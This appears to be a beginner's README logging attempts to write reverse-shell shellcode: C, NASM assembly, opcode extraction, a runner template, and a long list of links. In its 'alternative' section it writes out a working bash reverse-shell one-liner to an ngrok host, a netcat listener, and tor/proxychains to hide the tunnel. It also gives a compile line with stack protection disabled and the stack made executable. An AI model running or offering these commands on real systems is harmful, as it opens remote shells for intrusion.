# shell-noob

I'm a shell noob, so nothing exciting here.

I'm also new to asm and C, but hey, I'm sure I've done tricker stuff before (famous last words).




## Starting

So I started reading a neat little writeup on how to reverse shell bind from shellcode, how to extract the shellcode and create a runnner.

I'm new to this so it seemed to cover most of the basic concepts to get started, so I jumped in.

https://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat




## The problem

The article shows a popular reverse bind with netcat, but I have the BSD variant installed on my rig - which has the `-e` flag removed for obvious security reasons.

But that's fine, more than this being a copy/paste exercise, I decided to see if I could reverse engineer my findings and apply an alternative shellcode.




## The alternative

I use ngrok to reverse proxy my ports to the outside world.
```
tor service start
proxychains ngrok tcp 31337
```

Create an open port to receive the reverse shell.
```
nc -n -vv -l -p 31337
```

Now kick off the reverse shell.
```
/bin/bash -c "/bin/bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1"
```

Everything works fine... let's continue.




## Is injecting bash as a string possible in C?

After some initial googling I found it may not be possible to bind to /dev/tcp/x [1], as this is being done with some "magic bash"...

I might be able to fix this [3] by using execvp instead, just a wrapper for exec.

And it worked - reverse shell!




## Getting to assembly from C

This is the part I feared the most. I've zero experience with asm, the alternative syntax, debugging.
If this part goes wrong...

### Attempt 1 (a shortcut?)
Now I need to convert this to asm, so as per [2] I used `strace`;

```
strace -e execve ./bin/shellcode                      
execve("./bin/shellcode", ["./bin/shellcode"], [/* 120 vars */]) = 0
execve("/bin/bash", ["/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/0.tcp.e"...], [/* 120 vars */]) = 0
/bin/bash: connect: Connection refused
/bin/bash: /dev/tcp/0.tcp.ngrok.io/12345: Connection refused
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19295, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
```
I can't see this working for me just yet...

### Attempt 2
Looking back at the original tutorial and code [4], I'm thinking I could do the same with my custom line, and just call execve.

Now I attempt to compile with the nasm utility;

```
nasm -felf32 -o ./bin/shell-code.o ./shell-code.asm
```
Unfortunately this didn't run, there must be errors... I now work towards turning this in to a "hello world" example.

### Attempt 3
Followed a SO, so going to try this... 
```
gcc -S input.c -o output.asm -masm=intel
```
Nope, did not work for me - [5] there are fundamental differences between NASM and TASM [6].

### Attempt 4

So after some googling I ended up at this SO;
https://stackoverflow.com/questions/23204884/execv-example-is-segfaulting

It turns out that asm can't be run directly, but due to lack of "section" scaffolding, I'm starting to realize that this may be run inline (stack) vs executed as a program?

The post leads me to this resource;
http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html

The code looks very similar, except for a `BITS 32` declaration at the top of each example.

I will go with the _known_-working examples that spawn a `sh` shell locally

## Getting to Opcode from assembly

I'm using zsh so the original example threw me out a little, I made a quick fix...
```
for i in $(objdump -d ./bin/shell-code.o -M intel |grep "^ " |cut -f2); do echo -n '\\x'$i; done; echo
```

### Attempt 2



Compile nasm from written assembly
```
nasm -o ./bin/myshellcode.o ./myshellcode.s
```

Generate Opcode from compiled nasm assembly
```
./bin/test-asm -p ./bin/myshellcode.o
```

## Placing the Opcode in to a runner 

```
# copy the template
cp templates/shellcode-runner.c ./runner.c

# drop the opcode in to the template

# compile the runner
gcc ./runner.c -fno-stack-protector -z execstack -o shellcode
```


[1] https://stackoverflow.com/questions/44914538/execute-reverse-shell-using-execve

[2] http://www.arti-sec.com/article/create-shellcode-tcp-reverse-shell-slae

[3] https://stackoverflow.com/questions/14141007/c-executing-bash-commands-with-execvp

[4] https://gist.githubusercontent.com/Morgawr/9852347/raw/37fafdbfab6684d4fb374c826a2c1bc628cbe2b0/netcat-shellcode.asm

[5] https://stackoverflow.com/questions/8406188/does-gcc-really-know-how-to-output-nasm-assembly

[6] https://stackoverflow.com/questions/137038/how-do-you-get-assembler-output-from-c-c-source-in-gcc


## Other

Some notes on building, 

### Building

```
gcc ./shell-code.c -o ./bin/shellcode
```

### The runner

It seems that many shellcode tutorials use a common program template or husk to run the shellcode / bytearray.

I've included this in `templates/`.



## Resources

Some good resources for beginning this.

The original post that got me thinking;
https://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat

### Introductions to shellcoding
http://hackerforhire.com.au/part-1-disassembling-and-understanding-shellcode/
https://en.wikipedia.org/wiki/Shellcode
http://www.enderunix.org/docs/en/sc-en.txt
http://www.vividmachines.com/shellcode/shellcode.html
https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/

### Dealing with bash -c
https://stackoverflow.com/questions/14141007/c-executing-bash-commands-with-execvp
https://stackoverflow.com/questions/36022331/bash-i-dev-tcp-127-0-0-1-1234-01
https://stackoverflow.com/questions/16091382/pass-arguments-to-execve-program-in-shellcode

### Reversing shellcode to assembly
https://xorl.wordpress.com/2009/01/04/from-shellcode-to-assembly/
https://zeltser.com/convert-shellcode-to-assembly/
https://haiderm.com/convert-hex-assembly-using-simple-python-script/

### Examples of the "Stack Method (push)"
http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/

### NASM
https://ccm.net/faq/1559-compiling-an-assembly-program-with-nasm

### Introductions
https://www.tutorialspoint.com/assembly_programming/assembly_basic_syntax.htm


### Tools
https://github.com/reyammer/shellnoob

### Other / miscellaneous

https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/
https://brennan.io/2015/01/16/write-a-shell-in-c/


